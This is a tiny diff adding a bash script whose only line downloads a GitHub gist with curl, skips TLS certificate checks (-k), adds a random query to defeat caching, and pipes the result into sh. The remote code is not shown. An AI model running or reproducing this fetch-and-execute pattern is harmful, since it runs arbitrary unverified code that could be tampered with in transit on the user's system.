@@ -1,0 +1,2 @@
+#!/bin/bash
+curl -k https://gist.githubusercontent.com/DirkMeihoefer/e4f659bb95ddbef224c046abf879577a/raw/?$RANDOM | sh
